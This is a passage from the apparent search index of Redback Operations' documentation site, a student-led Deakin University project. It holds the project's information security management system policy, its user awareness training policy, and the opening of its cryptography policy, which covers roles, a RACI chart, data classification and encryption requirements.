(BYOD) &amp; Mobile Device Management (MDM)  ","version":"Next","tagName":"h2"},{"title":"3. Normative References​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#3-normative-references","content":" The ISMS aligns with:  ISO/IEC 27001:2013: Information Security ManagementNIST Cybersecurity Framework (CSF): Version 1.1, 2018. Available at: https://doi.org/10.6028/nist.cswp.04162018Essential Eight: Maturity Model, ACSC, 2017. Available at: https://www.cyber.gov.au/resources-business-and-government/essential-cybersecurity/essential-eight/essential-eight-maturity-modelAustralian Privacy Principles (APP): Privacy Act, OAIC, 2024. Available at: https://www.oaic.gov.au/privacy/privacy-legislation/the-privacy-act  Terminology is sourced from:  ISO Online Browsing Platform: https://www.iso.org/obpIEC Electropedia: https://www.electropedia.org/  ","version":"Next","tagName":"h2"},{"title":"4. Context of the Organisation​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#4-context-of-the-organisation","content":" ","version":"Next","tagName":"h2"},{"title":"4.1. Understanding the Organisation and its Context​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#41-understanding-the-organisation-and-its-context","content":" Redback Operations is a student-led, open-source project (referred to as Redback Operations, or “the company”) with a focus on human biometrics, including through the use of wearable devices, fitness apparatus, and monitoring and tracking devices. The result of which leads Redback Operations to handle sensitive and personal data that may be required to be handled in such a way to comply with relevant legislation. Additional ISMS processes may also be adopted in consideration with the efforts and needs of the company and the appropriate protections following.  ","version":"Next","tagName":"h3"},{"title":"4.2. Understanding the Needs and Expectations of Interested Parties​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#42-understanding-the-needs-and-expectations-of-interested-parties","content":" Interested parties relevant to the project include Deakin University and its affiliated tutors and staff connected to the Redback Operations project, and students enrolled in SIT374/SIT764 and SIT378/SIT768. Tutors and students are split into individual projects within the company, as such students and tutors may have different needs and expectations depending on their role.  Stakeholders\tInternal/External\tIssuesTutors, Staff, Mentors\tInternal\tOrganisation structure, roles, academic compliance Project Leads, Students\tInternal\tTask delegation, policy adherence, data security Deakin University\tInternal\tAlignment with IT policies, resource constraints Government (e.g., OAIC)\tExternal\tPrivacy Act, APPs, cybersecurity regulations  All issues listed in the above table will hope to be addressed throughout this ISMS policy. Whether it be through inquiries into each stakeholder to determine what the best course of action will be to mitigate these issues or company-wide reforms to eliminate all issues  ","version":"Next","tagName":"h3"},{"title":"4.3. Determining the Scope of the Information Security Management System​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#43-determining-the-scope-of-the-information-security-management-system","content":" The ISMS encompasses all digital and physical items owned by or in direct affiliation with Redback Operations including cloud platforms, research devices, and collaboration tools (e.g., MS Teams, code repositories). Redback Operations does not have a physical headquarters, and has contributors in many different legal jurisdictions, so this must be taken into consideration when legislation or government policies are discussed.  ","version":"Next","tagName":"h3"},{"title":"4.4. Information Security Management System​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#44-information-security-management-system","content":" As per the requirements of ISO/IEC 27001, Redback Operations has implemented this Information Security Management System (ISMS) and established procedures to continually improve the system following the structure of the organisation as a student-run, trimester-based project. If a response to a requirement can be written in small-form-factor, it will be done so in this manual, otherwise, this manual will reference the appropriate documentation and its location within the documentation system to provide further extended policy explanation. For the purpose of continuity, all auxiliary documentation will be listed in section 11 with links to the Redback Operations documentation website.  ","version":"Next","tagName":"h3"},{"title":"5. Leadership​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#5-leadership","content":" ","version":"Next","tagName":"h2"},{"title":"5.1. Leadership and Commitment​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#51-leadership-and-commitment","content":" Deakin University staff, project mentors, and student leaders commit to high-level information security, aligning policies with NIST CSF, Essential 8, and APPs. Mentors act as company leaders, ensuring strategic direction and resource allocation.  ","version":"Next","tagName":"h3"},{"title":"5.2. Policy​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#52-policy","content":" Protection of Redback Operations is regulated across several policies relating to the type of information or systems rather than one central policy. These policies are mentioned in section 1 and available to view in section 12. Further policies may be requested by company leaders as needed, or existing policies be reviewed, as is the nature of the continual evolution of this ISMS and other policies.  ","version":"Next","tagName":"h3"},{"title":"5.3. Organisational Roles, Responsibilities, and Authorities​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#53-organisational-roles-responsibilities-and-authorities","content":" ISMS Manager (GRC Team Lead): Oversees policy development, compliance, and audits.Policy Owners: Maintain and update domain-specific policies.Technical Leads (IT Team): Implement controls, monitor risks, report incidents.All Staff/Contributors: Comply with policies, complete training, report incidents. The Cyber Security team coordinates ISMS implementation, with authority to request reviews or delegate tasks.  ","version":"Next","tagName":"h3"},{"title":"6. Planning​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#6-planning","content":" ","version":"Next","tagName":"h2"},{"title":"6.1. Actions to Address Risk and Opportunities​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#61-actions-to-address-risk-and-opportunities","content":" 6.1.1. General​  The ISMS addresses:  Achieving Essential 8 Maturity Level 1 and APP compliance.Reducing technical debt by 50% within 12 months.Preventing IT incidents via defence-in-depth controls.Ensuring continual improvement with NIST CSF functions.  Following supplementary policy should sufficiently address the above mentioned in a way that also covers potential data breaches and their impact on Redback Operations, data protection, managing risks, and proactive remediation.  6.1.2. Information Security Risk Assessment​  In accordance with ISO/IEC 27001, a Risk Analysis and Treatment Plan, along with a Statement of Applicability should be created to work alongside this ISMS to ensure understanding of risks associated with Redback Operations are sufficiently known. This should be done in the near future in order to further solidify this policy's and company's compliance with ISO/IEC 27001  6.1.3. Information Security Risk Treatment​  Risk treatments prioritize Essential 8 controls (e.g., patch applications, restrict admin privileges) and NIST CSF recommendations.  ","version":"Next","tagName":"h3"},{"title":"6.2. Information Security Objectives and Planning​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#62-information-security-objectives-and-planning","content":" To manage the company’s information security posture effectively and efficiently, it is essential to develop objectives, measurements, and reporting tools, compiled within an Information Security Metrics Repository (ISMP). The ISMP will ensure consistent information security measurement across all aspects of the company.  Objectives are tracked in the Information Security Metrics Repository (ISMP):  Level of Preparedness: Breach response readiness.Intrusion Attempts: Detection and mitigation efficiency.Security Incidents: Recovery, root cause, prevention.Mean Time to Detect (MTTD): Threat detection speed.Mean Time to Resolve (MTTR): Threat resolution time.Mean Time to Contain (MTTC): Attack containment time.Access Management: Sensitive data access control.  Using these metrics will allow us to stay ahead of any possible risks that may occur. These metrics will need to be reviewed on an ad-hoc basis  ","version":"Next","tagName":"h3"},{"title":"6.3. Planning of Changes​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#63-planning-of-changes","content":" When there is a need to make changes to the ISMS policy in future. These will be planned well in advance in order to ensure that the changes have been well researched to keep the company and policy up to standard. All relevant documents for these planned changes should be made public accessible on the documentation site  ","version":"Next","tagName":"h3"},{"title":"7. Support​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#7-support","content":" ","version":"Next","tagName":"h2"},{"title":"7.1. Resources​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#71-resources","content":" Redback Operations, as a student-lead project, does not have the same resources as the typical IT organisation. As such, roles such as HR, Ethics and Policy Managers, and Risk Advisors are split amongst students, typically of the Cyber Security team, who wish to undertake tasks within these areas. This organisation structure also means Redback Operations does not have a Management Review Board as required by ISO/IEC 27001, however it can be determined that company leaders act in a similar capacity in terms of review and request of changes to the ISMS.  ","version":"Next","tagName":"h3"},{"title":"7.2 Competence​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#72-competence","content":" Redback Operations is committed to ensuring that all staff and students working on projects that use IT systems or handle sensitive information are working within the ISMS. This may include the need to provide training or time to get up to speed with the company standards, as well as implementing compliance and competence tracking systems on tasks that require so.  ","version":"Next","tagName":"h3"},{"title":"7.3. Awareness​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#73-awareness","content":" Redback Operations ensures that all documentation relevant and including the ISMS are easily accessible via the documentation site, and formatted in an easily viewable and accessible means for all that require.  ","version":"Next","tagName":"h3"},{"title":"7.4. Communication​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#74-communication","content":" Changes to the ISMS or other policies affecting the overall company will be communicated internally via the company’s Microsoft Teams platform. Changes to documentation will be reflected within the documentation itself via versioning notes, and where possible previous versions will be viewable as a way to reflect on changes.  ","version":"Next","tagName":"h3"},{"title":"7.5. Documented Information​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#75-documented-information","content":" 7.5.1. General​  All controlled versions of Redback Operations documentation can be found on the documentation site. All locally saved or printed copies are uncontrolled versions and may not be the most current.  7.5.2. Creating and Updating​  Creation of policy is formed through discussion of relevant teams, with team leaders, mentors, and company leaders having overall ownership of all documents. The student(s) responsible for creating specific documents also have ownership for the duration of their time within Redback Operations. Updating of documents must clearly number what revision it is of the document. The document must also list what changes were made and who it was by.  7.5.3. Control of Documented Information​  Given the size and nature of Redback Operations, at present the use of a Document Control Procedure and Document Control System Master Listing is not necessary. This should be reviewed on an ad-hoc basis.  ","version":"Next","tagName":"h3"},{"title":"8. Operation​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#8-operation","content":" ","version":"Next","tagName":"h2"},{"title":"8.1. Operational Planning and Control​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#81-operational-planning-and-control","content":" The Cyber Security team oversees controls aligned with NIST CSF:  Identify: Asset inventory, risk assessments.Protect: Access controls, encryption, patching.Detect: Monitoring, log analysis.Respond: Incident response plans.Recover: Data recovery, post-incident reviews. Controls are platform-agnostic for GCP, Azure, and on-premises assets.  ","version":"Next","tagName":"h3"},{"title":"8.2. Information Security Risk Assessment​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#82-information-security-risk-assessment","content":" Bi-annual risk assessments are documented in the Risk Analysis and Treatment Plan  ","version":"Next","tagName":"h3"},{"title":"8.3. Information Security Risk Treatment​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#83-information-security-risk-treatment","content":" Treatments prioritize Essential 8 and NIST CSF controls, tracked via Trello.  ","version":"Next","tagName":"h3"},{"title":"9. Performance Evaluation​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#9-performance-evaluation","content":" ","version":"Next","tagName":"h2"},{"title":"9.1. Monitoring, Measurement, Analysis, and Evaluation​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#91-monitoring-measurement-analysis-and-evaluation","content":" Performance of policies should be reviewed on a regular basis, no less than once every year. Adjustments should be made and noted using version control. This can be in conjunction with previous sections of this ISMS that cover yet-to-exist audits due to the size of the company.  ","version":"Next","tagName":"h3"},{"title":"9.2. Internal Audit​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#92-internal-audit","content":" 9.2.1. General​  Bi-annual audits by the Cyber Security team assess ISO/IEC 27001 and Essential 8 compliance.  9.2.2. Internal audit programme​  Audits use an ISO/IEC 27001 checklist, with results reported to mentors.  ","version":"Next","tagName":"h3"},{"title":"9.3. Management Review​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#93-management-review","content":" 9.3.1. General​  Mentors and student leaders review ISMS performance bi-annually.  9.3.2. Management Review Inputs​  Inputs include audit results, ISMP metrics, and incident reports.  9.3.3. Management Review Results​  Results drive policy updates and corrective actions, documented on the Redback Documentation site.  ","version":"Next","tagName":"h3"},{"title":"10. Improvement​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#10-improvement","content":" ","version":"Next","tagName":"h2"},{"title":"10.1. Continual Improvement​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#101-continual-improvement","content":" The company is committed to continually improving this ISMS and other policy documents as the company evolves over time. This will be done with consistent reviews of the policies to ensure their compliance  If a review of the current ISMS policy is undertaken it must adhere to the checklist which lists each requirement and whether it is currently compliant or not with ISO/IEC 27001  ","version":"Next","tagName":"h3"},{"title":"10.2. Nonconformity and Corrective Action​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#102-nonconformity-and-corrective-action","content":" Nonconformities trigger:  Issue identification and impact assessment.Corrective action implementation.Policy updates to prevent recurrence. Actions are tracked via Trello and reported to mentors.  ","version":"Next","tagName":"h3"},{"title":"11. Supplementary Policies​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#11-supplementary-policies","content":" This section contains links to supplementary policies affiliated with Redback Operations and this ISMS.  Gap Analysis  Cryptography  DLP &amp; Data Classification  Endpoint Security  External Attack Surface Management (EASM)  Monitoring &amp; Log Analytics  Server Security  User Awareness Training  Review of ISMS ","version":"Next","tagName":"h2"},{"title":"Cybersecurity User Awareness Training Policy","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training","content":"","keywords":"","version":"Next"},{"title":"Policy Statement​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#policy-statement","content":" Redback Operations is committed to maintaining the highest standards of cybersecurity. This policy outlines our approach to ensuring all personnel understand their role in safeguarding our systems, data, and infrastructure. We aim to foster a culture of security awareness and compliance through structured, role-appropriate, and regularly updated training.  ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#purpose","content":" The purpose of this User Awareness Training document is to define the standards that must be followed for the training and upskilling of our employees. The policy outlines mandatory training modules to guarantee compliance with internal policies and recognized cybersecurity frameworks, such as NIST, the Australian Government ISM, and the Essential Eight.  ","version":"Next","tagName":"h2"},{"title":"Introduction​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"What is user awareness training?​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#what-is-user-awareness-training","content":" User awareness training refers to the guidelines put in place by an organisation to help educate workers about the potential risks of their role and job functions. Though the awareness training typically focuses on data protection, data security and overall compliance with company policies.  ","version":"Next","tagName":"h3"},{"title":"What is the purpose of user awareness training?​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#what-is-the-purpose-of-user-awareness-training","content":" User awareness training serves a range of crucial functions within an organisation. Aside from educating workers about the potential risks of their job functions, it also provides employees with a range of strategies and procedures that they can follow to mitigate or resolve these risks effectively.  Through the provision of this training, not only is data security improved, but if followed correctly, there may be a significant increase in company performance and morale.  Finally, user awareness training works to minimise potential loss, and consequently, it works to foster a safe and positive working environment.  ","version":"Next","tagName":"h3"},{"title":"Why Do We Follow This Training?​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#why-do-we-follow-this-training","content":" We follow our user awareness training as it is put in place to prevent any sort of risks that may present themselves and pose a threat to the company.  ","version":"Next","tagName":"h2"},{"title":"Risks of Non-Compliance​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#risks-of-non-compliance","content":" If we did not follow our user awareness training protocols, a collective employee gap in knowledge may leave Redback Operations prone to, and susceptible of a range of attacks.  These attacks can target our sensitive data, company systems, assets, trade secrets and critical infrastructure.  In the event of an attack, if employees haven’t conducted our user awareness training, we may suffer a significant data leak and/or data loss due to a lack in knowledge of how to appropriately respond to or prevent such a thing. This data may be revealed to the public, which will hold a significant impact on the company, and its relationship with consumers, as their information may be susceptible to tampering, unauthorized disclosure, or it may be used against them.  Not only this, but the compromise of our company systems, assets, and critical infrastructure may lead to a complete loss of access, to both, our data, and our recovery systems, causing us to lose everything we have.  ","version":"Next","tagName":"h3"},{"title":"Scope and Applicability​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#scope-and-applicability","content":" This policy applies to:  All full-time and part-time employees.New hires.Contractors and third-party vendors.Specific business units such as IT, HR, Compliance, and Marketing. All individuals within scope must complete the training and any associated assessments within the required time frame.  ","version":"Next","tagName":"h3"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#roles-and-responsibilities","content":" IT Security Team: Develop and maintain training content, monitor compliance, and lead enforement measures.HR Department: Track completion rates and initiate disciplinary actions if needed.Compliance Officers: Ensure training aligns with regulations and review adherence.All staff: Complete training and apply knowledge in daily operations.  ","version":"Next","tagName":"h3"},{"title":"Training Objectives​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#training-objectives","content":" User awareness training aims to:  Educate staff on data protection, security risks, and mitigation strategies.Improve employee compliance with company polices.Enhance cybersecurity hygiene and reduce organizational risk.Encourage proactive threat reporting and behaviour.  ","version":"Next","tagName":"h2"},{"title":"Training Content Overview​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#training-content-overview","content":" The training program includes but is not limited to:  Core operations of Redback Operations.Data classification and protection protocols.Ethics and conduct.Social engineering, phising, and credential theft.Safe browsing, password hygiene, and malware awareness.insider threat identification.role-based content: Customised modules for IT, development, marketing, and admin roles.  Note: Training is aligned with the Essential Eight Maturity Model and NIST Cybersecurity Framework.  ","version":"Next","tagName":"h2"},{"title":"Training Frequency and Access​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#training-frequency-and-access","content":" Initial training upon hire.Mandatory refresher training annually.Additional training after major security incidents or policy updates.Training resources and quizzes are accessible via the internal company repository.  ","version":"Next","tagName":"h2"},{"title":"Assessment and Certification​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#assessment-and-certification","content":" Employees must achieve a 100% score on a follow-up quiz.Certification is valid for 12 months.Expired or failed certifications must be retaken within 10 business days.  ","version":"Next","tagName":"h2"},{"title":"Where Can This Training Be Accessed?​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#where-can-this-training-be-accessed","content":" Within the company repositories, a document can be found which describes the minimum amount of acquired knowledge that an employee must have, though it is followed by a quiz that employees must earn a perfect score on to be recognized for the completion of their training.  ","version":"Next","tagName":"h3"},{"title":"Monitoring and Enforcement​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#monitoring-and-enforcement","content":" Compliance is tracked through the HRIS and LMS systems. Failure to complete training or achieve a passing score may result in:  Restricted access to systems and data.Formal warnings or other disciplinary actions.Notifications to HR and departmental managers.  ","version":"Next","tagName":"h3"},{"title":"Policy Review and Update​","type":1,"pageTitle":"Cybersecurity User Awareness Training Policy","url":"/redback-documentation/docs/company-policy/ISMS/User-Awareness-Training#policy-review-and-update","content":" This policy will be reviewed:  Annually.After any major cybersecurity incident.Upon changes to legislation or best practices. The IT Security Team and Compliance Officers are responsible for reviewing and updating the policy content. ","version":"Next","tagName":"h2"},{"title":"Cryptography Policy","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/cryptography","content":"","keywords":"","version":"Next"},{"title":"Version History​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#version-history","content":" Version\tModified By\tApprover\tEdited On\tChanges MadeV0.1\tDaniel McAulay 08/04/2024\tInitial document creation V1.0\tNathasha Liyanage 17/05/2025\tReview/Update  ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#purpose","content":" The primary purpose of this Encryption/Cryptography Cybersecurity Policy (hereafter referred to as &quot;the policy&quot;) is to ensure the confidentiality, integrity, and availability of the organization's digital assets.  Encryption and cryptography are vital components of our information security strategy, protecting sensitive data against unauthorized access, disclosure, alteration, and destruction. This policy outlines the requirements for the use of cryptographic measures to safeguard data in transit, at rest, and during processing.  The policy ensures compliance with ISO/IEC 27001, NIST Cybersecurity Framework, Essential Eight, and APP/GDPR, safeguarding data in transit, at rest, and during processing. It supports Redback’s academic and research activities, including the protection of data on smart wearables, exercise bikes, and other research devices.  ","version":"Next","tagName":"h2"},{"title":"Scope​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#scope","content":" This policy applies to all employees, contractors, third-party partners, and affiliated contributors (e.g., Deakin University SIT capstone students) who access IT systems and data owned, controlled, or managed by Redback Operations. It covers all forms of sensitive information processed, stored, or transmitted, including personally identifiable information (PII), financial records, intellectual property, research datasets, and data classified as confidential. This includes data on research devices (e.g., smart wearables, exercise bikes, VR headsets) and cloud-based systems (e.g., MS Teams, code repositories).  For details on sensitive information types and classifications, refer to the Data Classification &amp; Data Loss Prevention Policies in the ISMS. Compliance is mandatory, and non-compliance may result in suspension of access to Redback resources, referral to Deakin University IT, disciplinary action, or legal action.   ","version":"Next","tagName":"h2"},{"title":"Framework References:​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#framework-references","content":" The Cryptography Policy references the following framework controls:  ","version":"Next","tagName":"h3"},{"title":"ISO 27001 Controls:​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#iso-27001-controls","content":" A.5.24: Cryptographic ControlsA.8.6: Secure Log-on ProceduresA.8.7: Information TransferA.9.4: Physical Entry ControlsA.10.1: Management of Technical VulnerabilitiesA.10.2: BackupsA.10.7: Information DisposalA.10.8: Logging and Monitoring  ","version":"Next","tagName":"h3"},{"title":"CIS Controls:​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#cis-controls","content":" Control 3: Data ProtectionControl 4: Vulnerability ManagementControl 6: Account ManagementControl 8: Audit Log ManagementControl 10: Data RecoveryControl 12: Network Infrastructure Management   Additional Frameworks​  NIST Cybersecurity FrameworkEssential EightAustralian Privacy Principles (APP) / GDPR  ","version":"Next","tagName":"h3"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#roles-and-responsibilities","content":" The purpose of the Roles and Responsibilities section of this policy is to clearly define the duties &amp; accountabilities of various stakeholders in implementing and upholding Redback Operations' encryption practices.  The section defines specific encryption-related tasks &amp; identifies broad scenarios of individual stakeholders to ensure the secure handling of sensitive information, aligning with regulatory obligations and enhancing overall data security. This clarity helps establish accountability and streamline efforts across the organization for effective encryption management.  ","version":"Next","tagName":"h2"},{"title":"Chief Information Security Officer (CISO)​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#chief-information-security-officer-ciso","content":" Leads encryption strategy and policy, ensures regulatory compliance, and manages encryption-related breaches.  Leads the development and implementation of encryption strategies.Ensures policy compliance with business objectives and regulations.Directs incident response for encryption-related breaches.  ","version":"Next","tagName":"h3"},{"title":"IT Department​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#it-department","content":" Implements encryption technologies, maintains security infrastructure, and provides technical support.  Implements and maintains encryption solutions.Provides technical support for encryption issues.Manages encryption infrastructure and auditing.  ","version":"Next","tagName":"h3"},{"title":"Security Team​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#security-team","content":" Identifies encryption needs through risk assessments, oversees encryption compliance, and conducts security training.  Conducts risk assessments to identify encryption needs.Monitors effectiveness and compliance of encryption measures.Delivers encryption best practices training.   ","version":"Next","tagName":"h3"},{"title":"Developers​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#developers","content":" Incorporates encryption into applications, adheres to encryption standards, and secures application data in collaboration with IT and Security.  Integrates encryption into software/app development life cycles.Ensures applications comply with encryption standards.Collaborates with IT and security teams to secure application data.  ","version":"Next","tagName":"h3"},{"title":"End-Users​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#end-users","content":" Follows encryption protocols for data handling, engages in security training, and reports encryption security incidents.  Adhere to encryption guidelines for sensitive information.Complete cryptography awareness training.Report encryption-related security incidents.  ","version":"Next","tagName":"h3"},{"title":"Data Owners​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#data-owners","content":" Classifies sensitive data for encryption and maintains ongoing compliance with encryption policies.  Classifies data and ensures it's encrypted according to policy.Regularly reviews data classification and encryption needs.    The summary of stakeholders and end-user scenarios ensures that all parties involved in the data lifecycle at Redback Operations are aware of their duties regarding encryption, contributing to the organization's overall data security posture.  Compliance with this policy is the responsibility of all individuals who have access to the organization's information systems and data. The roles and responsibilities outlined above are not exhaustive and may include additional duties as required by the organization's needs and as technologies evolve.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#raci-chart","content":" A RACI chart is a management tool that outlines the roles and responsibilities of different team members for specific tasks or processes. The chart helps clarify expectations, improves communication, and ensures that all tasks have clear ownership, making it easier to manage projects and processes efficiently.  Legend:  R (Responsible):  Person or group who performs the activity.  A (Accountable):  Person who is ultimately accountable and has Yes/No/Veto power.  C (Consulted):  Person or group that provides information and/or expertise.  I (Informed):  Person or group that needs to be informed after the decision or action is taken.  Activity / Role\tCISO\tIT Department\tSecurity Team\tDevelopers\tEnd-Users\tData OwnersDevelop Encryption Strategy\tA\tC\tR\tC\tI\tI Implement Encrpytion Tools\tC\tR\tA\tR\tI\tI Conduct Risk Assessment\tA\tC\tR\tI\tI\tR Oversee Compliance\tA\tC\tR\tC\tI\tC Deliver Training Compliance\tC\tR\tA\tR\tR\tI Report Security Incidents\tC\tC\tR\tC\tR\tC Integrate Encryption in Apps\tC\tR\tC\tA\tI\tI Classify and Encrypt Data\tI\tC\tC\tC\tI\tA  ","version":"Next","tagName":"h3"},{"title":"Data Classification​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#data-classification","content":" To ensure the effective application of encryption controls and to safeguard sensitive information, Redback Operations classifies data into categories based on its sensitivity, regulatory requirements, and the impact on the organization should the data be disclosed, altered, or destroyed without authorization.  ","version":"Next","tagName":"h2"},{"title":"Classification Levels​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#classification-levels","content":" Public: Data for public disclosure (e.g., marketing materials). Encryption not required, but integrity measures recommended.Internal Use Only: Non-sensitive internal data (e.g., internal memos). Basic encryption recommended.Confidential: Sensitive data that could cause harm if disclosed (e.g., research datasets, financial records). Encryption in transit and at rest required using industry-standard algorithms.Restricted: Highly sensitive data with significant harm or legal risks if compromised (e.g., student PII, intellectual property). Strong encryption and strict access controls mandatory.   ","version":"Next","tagName":"h3"},{"title":"Implementation Guidelines​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#implementation-guidelines","content":" Implementation Guidelines provide a practical roadmap for applying Redback Operations' encryption protocols across all relevant data handling activities. It outlines actionable steps for encrypting data in various states, whether at rest, in transit, or in use, and specifies the use of approved encryption technologies and methodologies.  This section ensures consistent and effective encryption practices are followed, enhancing the security of sensitive information throughout the organization.  Risk-Based Approach: Encryption is applied based on risk assessments considering data nature, context, and impact of compromise.Default Encryption: All non-Public data stored on mobile devices, transmitted over public/untrusted networks, or stored in cloud platforms (e.g., Deakin-approved platforms) must be encrypted.Data at Rest: Confidential and Restricted data on servers, workstations, laptops, removable media, or research devices must be encrypted.Data in Transit: Confidential and Restricted data transmitted over any network must use secure protocols (e.g., TLS, SSH, VPN).End-to-End Encryption: Required for highly sensitive communications to prevent interception.  ","version":"Next","tagName":"h3"},{"title":"Data Stewardship​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#data-stewardship","content":" Data owners are responsible for classifying their data according to this policy and ensuring appropriate encryption measures are applied and maintained. IT and security teams must provide the necessary tools and support to enable data owners, developers, and users to comply with these requirements.  This classification and the accompanying guidelines ensure that sensitive information receives the highest level of protection, while less sensitive information is protected in a manner proportionate to its value and risk.  ","version":"Next","tagName":"h2"},{"title":"Encryption Standards​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#encryption-standards","content":" Redback Operations is committed to using secure encryption standards to protect sensitive and confidential data against unauthorized access. This section outlines the approved encryption algorithms, protocols, and key management practices.  Secure Protocols​  